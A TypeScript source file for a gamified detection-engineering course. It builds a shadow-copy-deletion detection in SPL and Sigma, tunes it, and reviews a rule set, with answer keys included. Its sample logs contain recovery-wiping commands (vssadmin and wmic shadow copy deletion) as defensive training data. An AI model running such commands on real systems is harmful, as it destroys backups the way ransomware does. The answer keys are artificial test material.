import type { RoomExperience } from "./types";

// "Operation First Rule" for the "use-case-development" room.
// Script: docs/campaign/73-use-case-development.md.
// Station task ids must match the room's task order exactly (see getRoomExperience).
//
// Merrow Dock Authority (fictional port), not the graded tasks' corp.com records.
// Mentor: Paloma Ferreira, Detection Engineer.
// Signature, Ship a Rule: one idea goes from threat to deployed rule. A hunt in SPL builds the
// detection against sample data, a tune measures it against true and false positives, and a
// spotdiff compares the Sigma rule before and after tuning. The lesson: a rule without a test,
// a tuning record and an owner is not a use case.
// Game mix: codebreak + hunt + spotdiff + tune. (labIntegrity counts spotdiff as an arcade kind.)
//
// TASK ORDER CHANGED. The room lists all three readings first, then the questions, so it cannot
// be cut into stations. New order, for the integrator:
//   ucd-read-1, ucd-q1 | ucd-read-2, ucd-q2, ucd-m1 | ucd-read-3, ucd-q3 | ucd-log-1
//
// Lab data differs from the graded tasks: the worked detection is shadow copy deletion (T1490),
// never encoded PowerShell (q2, log-1); the mapping drill uses T1490, T1486, T1543.003,
// T1021.002 and T1547.001, none of the five pairs in m1; the noisy rules are a CCTV upload and
// a mailbox download count, never failed logins after a merger (q3); the alert read in the boss
// warm-up is mshta from a public folder started by a script host, never PowerShell from Temp
// started by cmd.exe (log-1); the unowned detection is a query in a notebook and a saved search
// nobody can explain, never a departing analyst (q1).

/** The spotdiff renders in HTML, which drops plain leading spaces, and YAML needs its indent. */
const y = (depth: number, line: string) => "\u00A0".repeat(depth * 2) + line;

export const USE_CASE_DEVELOPMENT: RoomExperience = {
  roomId: "use-case-development",
  codename: "Operation First Rule",
  theme: "firstrule",
  handler: { name: "Paloma Ferreira", role: "Detection Engineer, Merrow Dock Authority" },
  briefing: [
    "Merrow Dock Authority. Three terminals, 410 staff, and a berth schedule that cannot miss a tide.",
    "The SIEM (Security Information and Event Management system, where every log lands) has run for two years. It is full of rules, and nobody can say which ones work.",
    "This week a sector notice landed: ransomware crews are hitting ports, and they wipe the recovery copies first. Paloma Ferreira wants one rule done properly, end to end, live by Friday: the first that counts.",
    "Take one idea from threat to deployed rule. A rule with no test, no tuning record and no owner doesn't count.",
  ],
  mission: "Turn a sector notice into a use case, build the detection in SPL against sample data, measure it on a month of real hits, ship the tuned Sigma rule, keep a rule set healthy, then read the first alert a new rule raises.",
  estimate: "~50 min",
  look: { primary: "#86e3ce", secondary: "#ffb4a2", warn: "#e63946" },
  scene: "facilityfirstrule",
  layout: "facility",
  stations: [
    {
      id: "idea",
      label: "The Threat Idea",
      topic: "What a use case is · the six parts · the lifecycle · the Use Case Registry",
      tagline: "Plenty of rules. Which ones count?",
      building: "control",
      taskIds: ["ucd-read-1", "ucd-q1"],
    },
    {
      id: "build",
      label: "Build the Rule",
      topic: "Prioritising with ATT&CK · Sigma rules · SPL · testing a detection · mapping behaviour to techniques",
      tagline: "From a sentence to a query",
      building: "lab",
      taskIds: ["ucd-read-2", "ucd-q2", "ucd-m1"],
    },
    {
      id: "tune",
      label: "Tune the Rule",
      topic: "True and false positives · precision and recall · why rules decay · reviews and the registry",
      tagline: "Measure it, or it's only an opinion",
      building: "office",
      taskIds: ["ucd-read-3", "ucd-q3"],
    },
    {
      id: "first-alert",
      label: "The First Alert",
      topic: "Scoped suppressions · reading the context around a rule match",
      tagline: "Go-live, then a page",
      building: "ticket",
      taskIds: ["ucd-log-1"],
      boss: true,
    },
  ],
  personas: {
    "ucd-q1": { name: "Paloma Ferreira", role: "Detection Engineer", line: "Before we write another line, one question about keeping what we build." },
    "ucd-q2": { name: "Paloma Ferreira", role: "Detection Engineer", line: "Open the rule file with me. Where does this go?" },
    "ucd-m1": { name: "Paloma Ferreira", role: "Detection Engineer", line: "Five observables from the backlog. Tag them." },
    "ucd-q3": { name: "Paloma Ferreira", role: "Detection Engineer", line: "A loud rule just landed on my desk. What's your first move?" },
    "ucd-log-1": { name: "Paloma Ferreira", role: "Detection Engineer", line: "A rule went live minutes ago and something fired. Read it with me." },
  },
  briefings: {
    // ── Reading 1: what a use case is ──
    "ucd-read-1": [
      {
        kind: "anatomy",
        title: "Six Parts of a Use Case",
        prompt: "A use case is a documented detection scenario: if this pattern shows up in these logs, raise this alert for this person to act on. Paloma has opened Merrow's first draft, written from the sector notice. Scan each part to see what job it does.",
        source: "Use case draft · UC-IMPACT-0001",
        fields: [
          { key: "Hypothesis", value: "An attacker deletes volume shadow copies on a server just before encrypting it, so the port cannot roll back.", label: "What you are looking for", note: "Plain English, about attacker behaviour. If you can't say it in a sentence, you aren't ready to write a query." },
          { key: "Data Source", value: "Sysmon Event ID 1 (process creation), index=sysmon", label: "Where you would see it", note: "No log, no detection. Sysmon is a Windows tool that records every process start with its full command line." },
          { key: "Detection Logic", value: "SPL query, not yet written", label: "The filter", note: "The query in your SIEM's language, or a Sigma rule. It's the part people mistake for the whole use case." },
          { key: "Severity", value: "High", label: "How bad if real", note: "Critical, High, Medium or Low. Here encryption may be minutes away, so this one pages someone." },
          { key: "Response Playbook", value: "PB-014: isolate the host, call the duty manager, confirm the backups are intact", label: "What to do", note: "An alert with no next step just hands someone a worry at 03:00." },
          { key: "Exceptions", value: "To be confirmed in testing", label: "Known good", note: "Patterns that should not alert. They are found by testing, never guessed, and each one is written down, because each one is also a place the rule can't see." },
        ],
        summary: "Hypothesis, data source, detection logic, severity, response playbook, exceptions. A query covers one of the six. Without use cases a SIEM is only expensive log storage: it keeps everything and tells nobody anything.",
      },
      {
        kind: "sequence",
        title: "From Idea to Live Rule",
        prompt: "The notice is the start of a life cycle, and the rule going live isn't the end of it. Tap the eight stages in the order Paloma will work them.",
        items: [
          { id: "deploy", text: "Deploy", note: "Push it to the production SIEM." },
          { id: "write", text: "Write detection logic", note: "Draft the query or the rule." },
          { id: "maintain", text: "Maintain", note: "Revisit when logs, software or the attack change." },
          { id: "identify", text: "Identify the threat", note: "A real threat relevant to this organisation." },
          { id: "tune", text: "Tune", note: "Adjust thresholds, add exceptions, refine conditions." },
          { id: "map", text: "Map to a data source", note: "Which logs would capture this behaviour?" },
          { id: "document", text: "Document", note: "Write it up in the Use Case Registry." },
          { id: "test", text: "Test with real data", note: "Does it catch the attack? How much noise does it make?" },
        ],
        order: ["identify", "map", "write", "test", "tune", "document", "deploy", "maintain"],
        doneNote: "Test and tune come before deploy, and document comes before deploy too, so nothing reaches production unexplained. Step 2 can end the project early: if Merrow has no log that shows the behaviour, there is nothing to write. Step 8 never finishes.",
      },
      {
        kind: "sort",
        title: "Use Case or Just a Rule?",
        prompt: "An auditor will ask what Merrow is detecting, so Paloma has pulled seven entries off the SIEM and the team's shared drive. Sort each one. Paloma's bar: a use case has a test, a tuning record and an owner, on top of the logic.",
        buckets: [
          { id: "yes", label: "Use case" },
          { id: "no", label: "Not a use case yet" },
        ],
        items: [
          { id: "i1", text: "UC-NET-0004: hypothesis, proxy logs, query, severity, playbook link, exception list, last replay test 12 October, owned by the SOC lead", bucket: "yes", why: "All six parts, plus evidence it works and a named person who answers for it." },
          { id: "i2", text: "Saved search ps_stuff_2. No description, no owner. Nobody can say whether it has ever fired.", bucket: "no", why: "It may run forever, and it still protects nobody in particular: no one can tell what it is meant to catch or whether it still does." },
          { id: "i3", text: "A vendor default rule, switched on the day the SIEM arrived, never run against Merrow's own logs", bucket: "no", why: "Good logic, untested here. Until it meets your data it's a hypothesis about your environment." },
          { id: "i4", text: "A clever query in one analyst's personal notebook. It caught a real intrusion in a training lab. It isn't in the registry.", bucket: "no", why: "If nobody else can find it or explain it, the coverage is one person's memory. If it isn't documented, it doesn't exist." },
          { id: "i5", text: "UC-IDENTITY-0002: full record, purple team test last month, tuning history in the repository, named owner, status in-testing", bucket: "yes", why: "Status in-testing is fine. It's still a use case: documented, measured and owned, just not in production yet." },
          { id: "i6", text: "A dashboard panel someone looks at on Fridays", bucket: "no", why: "A dashboard needs a person to look. A use case has a trigger, and it comes to you." },
          { id: "i7", text: "An alert with a playbook and an owner, and no record it has ever been tested", bucket: "no", why: "Close. But nobody knows whether it catches the attack, and the first test shouldn't be the real attack." },
        ],
      },
    ],
    // ── Reading 2: ATT&CK, Sigma, testing ──
    "ucd-read-2": [
      {
        kind: "worksheet",
        title: "Which Idea Ships First?",
        prompt: "MITRE ATT&CK is the public catalogue of attacker techniques, so a detection team can walk it and ask of each technique: do we have a use case for that? Nobody can cover it all. Paloma weighs each idea on threat intelligence, what Merrow can see today, and impact.",
        caption: "Detection backlog · Merrow Dock Authority",
        columns: ["Idea", "Threat intelligence", "Log source today", "Impact if real"],
        rows: [
          ["Shadow copy wipe", "Sector notice: two ports hit this year", "Yes, Sysmon", "Berths stop, no quick restore"],
          ["Crane controller tamper", "Same notice names it as a fear", "None from the crane network", "Severe"],
          ["Web shop card skimming", "Seen against retailers", "Yes, web logs", "None: Merrow has no web shop"],
          ["Public site port scans", "Constant background noise", "Yes, firewall", "Low: reconnaissance only"],
        ],
        questions: [
          { id: "first", q: "Which idea ships first?", hint: "It has to pass all three columns.", answer: ["Shadow copy wipe", "shadow copy", "shadow copies", "shadow"], why: "Real threat to this sector, visible in logs Merrow already has, and it leads straight to the worst day. That's why T1490, Inhibit System Recovery, goes first." },
          { id: "blocked", q: "Which idea is frightening but can't be built yet?", hint: "Read the log source column.", answer: ["Crane controller tamper", "crane controller", "crane", "controller"], why: "You can only detect what you can see. Severity doesn't help when no log reaches the SIEM." },
          { id: "fix", q: "What has to arrive before that idea can be built? (one or two words)", hint: "It's the second stage of the life cycle.", answer: ["logs", "log source", "a log source", "log sources", "data source", "data sources", "telemetry"], why: "Record the gap and ask for the logs. A backlog entry that says 'blocked: no data source' is honest coverage reporting." },
        ],
      },
      {
        kind: "anatomy",
        title: "Inside a Sigma Rule",
        prompt: "Write a rule in one SIEM's language and you are locked to that SIEM. Sigma is the way out: an open rule format in YAML. This is Paloma's Monday draft, written before anyone tested it. Scan each section and note which one actually decides what fires.",
        source: "Sigma rule (YAML) · volume_shadow_copies_deleted.yml · v1",
        fields: [
          { key: "title", value: "Volume Shadow Copies Deleted", note: "A name a person can read in an alert queue." },
          { key: "id", value: "7c1e4b52-9a3f-4d06-8b27-51d0e6f3a914", note: "A UUID. It follows the rule through renames and repositories." },
          { key: "status", value: "experimental", note: "Maturity: experimental, then test, then stable. Paloma has earned nothing above experimental yet." },
          { key: "description", value: "Detects deletion of volume shadow copies, a common step before ransomware encrypts.", note: "What the rule detects, for the person who didn't write it." },
          { key: "references", value: "https://notices.ports-sector.example/2026-118", note: "Links about the threat. Reading material only, and nothing here runs." },
          { key: "tags", value: "attack.impact, attack.t1490", label: "ATT&CK mapping", note: "This is how coverage reports get built: count the rules per technique." },
          { key: "logsource", value: "category: process_creation, product: windows", label: "Which logs", note: "An abstract kind of log. It chooses where the rule looks, not which events are innocent. The converter maps it to Merrow's index=sysmon EventCode=1." },
          { key: "detection", value: "selection: Image|endswith '\\vssadmin.exe' AND CommandLine|contains 'shadow'. filter_main_keelsafe: ParentImage|endswith '\\ksagent.exe'. condition: selection and not filter_main_keelsafe", label: "The logic", note: "The only section that decides what fires. Change this and you change what the rule matches. Every exclusion written here is a real blind spot." },
          { key: "falsepositives", value: "Unknown", label: "Notes for the analyst", note: "The benign causes an analyst should expect. Converters ignore this field." },
          { key: "level", value: "high", note: "critical, high, medium or low." },
        ],
        summary: "Sigma is vendor neutral. A converter such as pySigma, or the older sigmac, turns this YAML into SPL for Splunk, KQL for Microsoft Sentinel or EQL for Elastic, and the SIEM runs that query, never the YAML. Change SIEM and the rules come with you. Keep the sections straight: detection changes behaviour, and falsepositives, references and description only change what people know.",
      },
      {
        kind: "hunt",
        title: "Build the Detection in SPL",
        prompt: "Time to test the idea. SPL (Search Processing Language) is the query language of Merrow's Splunk-style SIEM. This index holds a week of Sysmon process starts. Mixed in are three test attacks from the purple team (attackers and defenders working together), run as adm-purple and with a stolen svc_keelsafe login on two lab hosts. Build the search one line at a time, and every result is what that line really returns.",
        language: "SPL",
        console: "Search",
        start: "index=sysmon EventCode=1",
        goal: "every purple test, one row per alert, no routine jobs",
        tables: [
          {
            name: "index=sysmon EventCode=1",
            note: "Sysmon process creation events.",
            columns: ["_time", "Computer", "User", "Image", "CommandLine", "ParentImage"],
            rows: [
              ["2026-11-02 01:00:14", "MDA-BK-01", "MERROW\\svc_keelsafe", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin delete shadows /for=D: /oldest /quiet", "C:\\Program Files\\Keelsafe\\ksagent.exe"],
              ["2026-11-03 01:00:09", "MDA-BK-01", "MERROW\\svc_keelsafe", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin create shadow /for=D:", "C:\\Program Files\\Keelsafe\\ksagent.exe"],
              ["2026-11-03 01:00:11", "MDA-BK-02", "MERROW\\svc_keelsafe", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin delete shadows /for=D: /oldest /quiet", "C:\\Program Files\\Keelsafe\\ksagent.exe"],
              ["2026-11-03 09:12:40", "MDA-IT-04", "MERROW\\adm-r.castro", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin list shadows", "C:\\Windows\\System32\\cmd.exe"],
              ["2026-11-03 10:41:02", "MDA-OPS-11", "MERROW\\t.lindqvist", "C:\\Windows\\System32\\notepad.exe", "notepad.exe C:\\Users\\t.lindqvist\\shadow_shift_notes.txt", "C:\\Windows\\explorer.exe"],
              ["2026-11-04 14:21:07", "MDA-LAB-02", "MERROW\\adm-purple", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin delete shadows /all /quiet", "C:\\Windows\\System32\\cmd.exe"],
              ["2026-11-04 14:21:31", "MDA-LAB-02", "MERROW\\adm-purple", "C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic shadowcopy delete /nointeractive", "C:\\Windows\\System32\\cmd.exe"],
              ["2026-11-04 14:26:52", "MDA-LAB-03", "MERROW\\adm-purple", "C:\\Windows\\System32\\vssadmin.exe", "VSSADMIN.EXE DELETE SHADOWS /ALL /QUIET", "C:\\Users\\Public\\ksagent.exe"],
              ["2026-11-04 14:31:12", "MDA-LAB-03", "MERROW\\svc_keelsafe", "C:\\Windows\\System32\\vssadmin.exe", "vssadmin delete shadows /all /quiet", "C:\\Windows\\System32\\cmd.exe"],
              ["2026-11-04 15:03:18", "MDA-FS-02", "MERROW\\svc_monitor", "C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir D:\\exports /b", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"],
            ],
          },
        ],
        rungs: [
          {
            id: "wide", ask: "Line 2: start wide. Keep every process whose command touches shadow copies.",
            choices: [
              { id: "a", text: '| search CommandLine="*shadow*"', right: true, why: "The search command takes wildcards and ignores case, so this reaches vssadmin and wmic alike. The notepad row came along too: wide on purpose, and you narrow next.", apply: { op: "where", col: "CommandLine", test: "has", value: "shadow" } },
              { id: "b", text: '| where CommandLine="*shadow*"', why: "No rows. The where command compares literally, so * here is just a star character. Wildcards belong to search.", apply: { op: "where", col: "CommandLine", test: "eq", value: "*shadow*" } },
              { id: "c", text: '| search Image="*shadow*"', why: "No rows. Image is the path of the program that ran. The words about shadow copies are in the arguments, in CommandLine.", apply: { op: "where", col: "Image", test: "has", value: "shadow" } },
            ],
          },
          {
            id: "act", ask: "Line 3: the hypothesis is about destroying copies. Keep that act and nothing gentler.",
            choices: [
              { id: "a", text: '| where like(CommandLine, "%delete%")', why: "One purple test vanished. like() in where is case sensitive, and the attacker typed VSSADMIN.EXE DELETE in capitals. Windows doesn't care about case, so your rule can't either.", apply: { op: "where", col: "CommandLine", test: "notin", value: ["vssadmin create shadow /for=D:", "vssadmin list shadows", "notepad.exe C:\\Users\\t.lindqvist\\shadow_shift_notes.txt", "VSSADMIN.EXE DELETE SHADOWS /ALL /QUIET"] } },
              { id: "b", text: '| search NOT CommandLine="*list*"', why: "You removed one harmless command and kept the rest, including notepad. Describe the harmful act: you can never list everything harmless.", apply: { op: "where", col: "CommandLine", test: "notin", value: ["vssadmin list shadows"] } },
              { id: "c", text: '| search CommandLine="*delete*"', right: true, why: "Listing and creating copies are gone, and capitals don't matter. Six rows left: two nightly backup jobs and the four commands from the test attacks.", apply: { op: "where", col: "CommandLine", test: "has", value: "delete" } },
            ],
          },
          {
            id: "except", ask: "Line 4: Keelsafe, the backup agent, trims its old copies every night. Except that job and nothing more.",
            choices: [
              { id: "a", text: '| search NOT ParentImage="C:\\\\Program Files\\\\Keelsafe\\\\ksagent.exe"', right: true, why: "The exact path of the real agent. An attacker would need write access to Program Files to borrow it, and the test runs all survive.", apply: { op: "where", col: "ParentImage", test: "notin", value: ["C:\\Program Files\\Keelsafe\\ksagent.exe"] } },
              { id: "b", text: '| search NOT ParentImage="*ksagent.exe"', why: "A purple test disappeared. Anyone can name a file ksagent.exe and run it from C:\\Users\\Public. An exception on a file name is an exception anyone can claim.", apply: { op: "where", col: "ParentImage", test: "notin", value: ["C:\\Program Files\\Keelsafe\\ksagent.exe", "C:\\Users\\Public\\ksagent.exe"] } },
              { id: "c", text: '| search NOT User="MERROW\\\\svc_keelsafe"', why: "A purple test disappeared: the one using a stolen svc_keelsafe login. Excepting an account hands the attacker a free pass the moment that password leaks.", apply: { op: "where", col: "User", test: "notin", value: ["MERROW\\svc_keelsafe"] } },
              { id: "d", text: '| search NOT (ParentImage="*ksagent.exe" OR User="MERROW\\\\svc_keelsafe")', why: "Only MDA-LAB-02 is left. You widened the exception twice and lost two of the three tests. Belt and braces is how a rule goes blind.", apply: { op: "where", col: "Computer", test: "eq", value: "MDA-LAB-02" } },
            ],
          },
          {
            id: "roll", ask: "Line 5: one intruder can run several commands. Roll the rows up to one row per alert, keeping where, who and what started it.",
            choices: [
              { id: "a", text: "| stats count by User", why: "Two rows, and no host: the analyst is paged with a name and nowhere to go.", apply: { op: "summarize", by: ["User"], as: "count" } },
              { id: "b", text: "| stats count by CommandLine", why: "Two different hosts folded into one row because they typed the same command, and the row doesn't say which hosts.", apply: { op: "summarize", by: ["CommandLine"], as: "count" } },
              { id: "c", text: "| stats count by Computer, User, ParentImage", right: true, why: "stats groups rows, and each group is an alert. Three rows: three test runs, three alerts.", apply: { op: "summarize", by: ["Computer", "User", "ParentImage"], as: "count" } },
              { id: "d", text: "| stats count", why: "One number, no names. You know how many, and nothing you could act on.", apply: { op: "summarize", by: [], as: "count" } },
            ],
          },
          {
            id: "finish", ask: "Line 6: last line. A colleague wants it quieter. Keep the rule honest and give the analyst a clean result.",
            choices: [
              { id: "a", text: "| where count>=2", why: "Two of the three tests vanished. An attacker needs one delete, not two. A threshold on a rare, destructive action buys quiet with a missed attack.", apply: { op: "where", col: "count", test: "notin", value: ["1"] } },
              { id: "b", text: "| table Computer, User, ParentImage, CommandLine, count", why: "CommandLine is an empty column. After stats, only the by fields and the aggregates still exist. To keep commands you would add values(CommandLine) to the stats line.", apply: { op: "project", cols: ["Computer", "User", "ParentImage", "CommandLine", "count"] } },
              { id: "c", text: "| table Computer, User, ParentImage, count", right: true, why: "All three tests caught, and nothing routine. That's a first pass on known data, and it proves the logic. It doesn't yet prove the noise.", apply: { op: "project", cols: ["Computer", "User", "ParentImage", "count"] } },
            ],
          },
        ],
        expect: 3,
        lesson: "Start wide on the behaviour, narrow to the harmful act, except only what you can name exactly, then roll up to something a person can act on. In SPL, search takes wildcards and ignores case, while where is literal and case sensitive. And notice what you just ran: a small dataset where every row's truth was already known. That's a unit test, and it's the first evidence a use case needs.",
      },
      {
        kind: "codebreak",
        title: "Name the Test",
        prompt: "A use case that has never met attack data is only a hypothesis. Paloma has four ways to change that. Name each one from its clue: letter feedback shows which characters sit in the right place.",
        tries: 6,
        rounds: [
          { id: "t1", clue: "A small dataset where the truth of every event is known: these must fire, those must stay quiet. A ___ test.", answer: "UNIT", why: "A unit test is fast and repeatable, so it runs after every change. That's what you just did on the sysmon sample." },
          { id: "t2", clue: "Hired testers attack without warning the SOC. Afterwards: did the rule fire, and if not, why not? One word, no space, no hyphen.", answer: "REDTEAM", why: "A red team exercise shows what happens when defenders don't know it's coming. It's a true test and a slow one." },
          { id: "t3", clue: "Attackers and defenders work side by side: one side runs each ATT&CK technique on purpose, the other checks in near real time that the rule caught it.", answer: "PURPLE", why: "Red plus blue. A purple exercise finds a missed detection and fixes it the same afternoon, which is how adm-purple got into that index." },
          { id: "t4", clue: "Logs from a past incident, or a public research dataset, fed back through the detection pipeline. A ___ test.", answer: "REPLAY", why: "Replay uses real attack traces with no attacker needed. Merrow has few incidents of its own, so sector samples fill the gap." },
        ],
        lesson: "Unit tests prove the logic on known data, replay proves it on real traces, and red and purple exercises prove the whole chain against a live attacker. Each one finds things the others miss, so note in the registry which ones the rule has passed and when.",
      },
    ],
    // ── Drill before the matching task ──
    "ucd-m1": [
      {
        kind: "match",
        title: "Read the Name, Not the Tool",
        prompt: "A use case starts from something you can observe, then gets an ATT&CK technique so coverage can be counted. Read each ID as parent plus variant: T1543.003 is T1543, Create or Modify System Process, variant .003, Windows Service. The words after the colon usually say how. Match what Paloma saw to its technique.",
        pairs: [
          { id: "m1", left: "vssadmin removes every shadow copy on a file server", right: "T1490, Inhibit System Recovery", why: "Ask what the behaviour achieves. The tool could be vssadmin or wmic. The effect is that recovery is gone, and that's the technique." },
          { id: "m2", left: "Thousands of files rewritten and renamed in minutes", right: "T1486, Data Encrypted for Impact", why: "The observable is the mass rewrite. No sub-technique needed: the name says it." },
          { id: "m3", left: "A new service whose binary path sits in C:\\ProgramData", right: "T1543.003, Create or Modify System Process: Windows Service", why: "The parent says a system process was created. The part after the colon says which kind." },
          { id: "m4", left: "ADMIN$ opened from one workstation, then a file copied across it", right: "T1021.002, Remote Services: SMB/Windows Admin Shares", why: "Parent Remote Services, and the variant names the admin share. The same parent has other variants for other ways in." },
          { id: "m5", left: "A value under HKCU\\...\\Run pointing at a user-writable path", right: "T1547.001, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder", why: "Starts at logon, through a Run key. The name describes exactly what the registry shows." },
        ],
      },
    ],
    // ── Reading 3: keeping use cases alive ──
    "ucd-read-3": [
      {
        kind: "tune",
        title: "Measure It on a Real Month",
        prompt: "The logic passes on sample data. Now the honest test: 30 days of rule hits, plus Paloma's test runs and sector samples, all labelled true or false. Every shadow copy delete should be rare, so set two rarity dials: how many hosts run this same parent and command, and how many times it ran on this host. The rule fires only if both are within your limits.",
        eventColumn: "Rule hit in the 30-day replay",
        dials: [
          { id: "hosts", label: "Hosts running this parent and command", short: "hosts", min: 1, max: 20, step: 1, start: 20, dir: "below" },
          { id: "runs", label: "Runs on this host in 30 days", short: "runs", min: 1, max: 30, step: 1, start: 30, dir: "below" },
        ],
        events: [
          { id: "a1", label: "Purple test: cmd.exe wipes copies on MDA-LAB-02", bad: true, values: { hosts: 2, runs: 1 } },
          { id: "a2", label: "Purple test: ksagent.exe from a user folder on MDA-LAB-03", bad: true, values: { hosts: 1, runs: 1 } },
          { id: "a3", label: "Purple test: svc_keelsafe logon on MDA-LAB-03", bad: true, values: { hosts: 2, runs: 1 } },
          { id: "a4", label: "Sector sample: PsExec service wipes 3 file servers", bad: true, values: { hosts: 3, runs: 1 } },
          { id: "a5", label: "Sector sample: operator retries a failing delete on 2 hosts", bad: true, values: { hosts: 2, runs: 6 } },
          { id: "a6", label: "Sector sample: startup script pushed to 12 servers at once", bad: true, values: { hosts: 12, runs: 1 } },
          { id: "n1", label: "Storage admin frees one full volume, change ticket raised", bad: false, values: { hosts: 1, runs: 1 } },
          { id: "n2", label: "Vendor installer on 8 gate PCs, once", bad: false, values: { hosts: 8, runs: 1 } },
          { id: "n3", label: "Weekly cleanup on the 5 CCTV recorders", bad: false, values: { hosts: 5, runs: 4 } },
          { id: "n4", label: "Disk-space task on the berth planning server", bad: false, values: { hosts: 1, runs: 8 } },
          { id: "n5", label: "Daily job on 3 print servers", bad: false, values: { hosts: 3, runs: 30 } },
          { id: "n6", label: "Twice-weekly script on 2 archive hosts", bad: false, values: { hosts: 2, runs: 9 } },
        ],
        goal: { catch: 5, maxFalse: 1 },
        deploys: 4,
        lesson: "Hosts at 3 or 4 and runs at 6 or 7 give 5 true positives and 1 false positive. Precision is real alerts divided by all alerts: 5 of 6, 83%. Recall is real attacks caught divided by all attacks: 5 of 6, 83%. Neither number was a feeling, and that's the point. The storage admin stays as an accepted false positive, because in the logs that job and an attacker's one-off delete look identical. The startup script on 12 servers is the cost: rarity can't see an attack pushed across the fleet in one go. Don't hide that. Write it in the tuning record, what you set, why, and what it now misses, and open a second use case for the mass push.",
      },
      {
        kind: "spotdiff",
        title: "Sigma Before and After Tuning",
        prompt: "Friday. Everything the tests taught has to land in the Sigma file, in Git, as v2. Plain Sigma matches single events, so the 30-day rarity dials stay in the scheduled search. Compare the two versions and tap only the lines that change what the rule matches. Lines written for people aren't logic.",
        goodTitle: "v1 · Monday, before testing",
        suspectTitle: "v2 · Friday, after tuning",
        hud: "Tap the lines that change what the rule matches",
        sameLine: "That line is the same in v1 and v2.",
        winTitle: "Every logic change found",
        howTo: [
          "Compare v2 with v1, line by line.",
          "Tap each line in v2 that changes which events the rule matches.",
          "A line that matches, or that only a person reads, costs a life.",
        ],
        good: [
          "title: Volume Shadow Copies Deleted",
          "status: experimental",
          "tags: [attack.impact, attack.t1490]",
          "logsource: {category: process_creation, product: windows}",
          "detection:",
          y(1, "selection:"),
          y(2, "Image|endswith: '\\vssadmin.exe'"),
          y(2, "CommandLine|contains: 'shadow'"),
          y(1, "filter_main_keelsafe:"),
          y(2, "ParentImage|endswith: '\\ksagent.exe'"),
          y(1, "condition: selection and not filter_main_keelsafe"),
          "falsepositives: ['Unknown']",
          "level: high",
        ],
        suspect: [
          "title: Volume Shadow Copies Deleted",
          "status: test",
          "tags: [attack.impact, attack.t1490]",
          "logsource: {category: process_creation, product: windows}",
          "detection:",
          y(1, "selection:"),
          y(2, "Image|endswith: ['\\vssadmin.exe', '\\wmic.exe']"),
          y(2, "CommandLine|contains|all: ['shadow', 'delete']"),
          y(1, "filter_main_keelsafe:"),
          y(2, "ParentImage: 'C:\\Program Files\\Keelsafe\\ksagent.exe'"),
          y(1, "condition: selection and not filter_main_keelsafe"),
          "falsepositives: ['Storage admin clearing a full volume under a change ticket']",
          "level: high",
        ],
        diffs: [
          { line: 6, why: "Wider. The purple test ran wmic shadowcopy delete, and v1 only looked at vssadmin. Tests find the attacks you forgot." },
          { line: 7, why: "Narrower. Both words must now appear, so an admin listing shadow copies stops firing. In Sigma, a list under |contains|all means every value must match." },
          { line: 9, why: "Narrower exception. v1 trusted any file called ksagent.exe, so the fake one in C:\\Users\\Public was invisible. v2 trusts one exact path." },
        ],
        decoys: [
          { line: 1, why: "A real difference, and no logic. Status moved from experimental to test because the rule earned it, but it tells people how far to trust the rule. It matches the same events." },
          { line: 11, why: "A real difference, and no logic. falsepositives lists the benign causes an analyst should expect, and converters ignore this field. The storage admin still fires, which is exactly why it's written here." },
        ],
        lesson: "A tuned rule changes in three places you can name, and each change traces back to a test: a miss, a false alarm, a blind spot. Because v1 and v2 are both in Git, anyone can see who changed what and when, and roll back a bad change. That history is half of the tuning record.",
      },
      {
        kind: "queue",
        title: "Quarterly Rule Review",
        prompt: "Environments change and rules decay, so every quarter Paloma reviews the top rules. Open each one and decide. A rule can go wrong loudly, or silently, and only one of those gets complaints.",
        console: "SIEM · Quarterly rule review",
        actions: [
          { id: "tune", label: "Tune", tone: "close" },
          { id: "repair", label: "Repair and retest", tone: "escalate" },
          { id: "keep", label: "Keep, log the review", tone: "close" },
          { id: "retire", label: "Retire, record why", tone: "contain" },
        ],
        alerts: [
          {
            id: "r1", time: "Q4 review", severity: "High", rule: "UC-ENDPOINT-0012 Suspicious service creation", entity: "0 alerts since 9 September",
            fields: [{ k: "Last alert", v: "2026-09-09" }, { k: "Change log", v: "EDR (endpoint detection and response) replaced 2026-09-10" }, { k: "Rule field", v: "process_path" }, { k: "New tool writes", v: "process.executable" }],
            context: "The rule shows green. Nobody has complained.",
            answer: "repair",
            why: "New log source, new field names, and the rule broke silently. Zero alerts here means blind, not calm. Fix the field mapping, then rerun the test to prove it fires.",
          },
          {
            id: "r2", time: "Q4 review", severity: "Medium", rule: "UC-NET-0031 Large upload to an unknown host", entity: "320 alerts a day",
            fields: [{ k: "Source of 318 a day", v: "MDA-CCTV-01" }, { k: "Destination", v: "198.51.100.40, the new CCTV archive" }, { k: "Change log", v: "Cloud archive live Monday" }, { k: "True positives last quarter", v: "2" }],
            context: "One new appliance explains nearly all of it, and the rule still caught two real cases last quarter.",
            answer: "tune",
            why: "New software looks like the behaviour. Add an exception scoped to that appliance and that destination.",
          },
          {
            id: "r3", time: "Q4 review", severity: "High", rule: "UC-WEB-0003 Known web shell file name", entity: "0 alerts in 90 days",
            fields: [{ k: "Logic", v: "FileName IN (fixed list of 4)" }, { k: "Threat intel", v: "Sector notice: the crew now randomises file names" }, { k: "Last tested", v: "2025-12-02" }],
            context: "The attacker read the same blog posts you did.",
            answer: "repair",
            why: "Attacker technique evolved. A threat intel update should trigger this review. Rewrite the logic around behaviour, such as a web server process writing a script file, then test it.",
          },
          {
            id: "r4", time: "Q4 review", severity: "Medium", rule: "UC-MAIL-0019 Mass mailbox download", entity: "Fires most hours",
            fields: [{ k: "Threshold", v: "50 items an hour, counted across all mailboxes" }, { k: "Mailboxes when tuned", v: "120" }, { k: "Mailboxes now", v: "380" }, { k: "Change", v: "Terminal crews moved onto company mail" }],
            context: "No single mailbox is near 50 an hour. The total is.",
            answer: "tune",
            why: "Threshold drift from an organisational change. The rule still has value: count per account, not across everybody, and record the change.",
          },
          {
            id: "r5", time: "Q4 review", severity: "Medium", rule: "UC-IDENTITY-0009 New admin added out of hours", entity: "2 alerts this quarter",
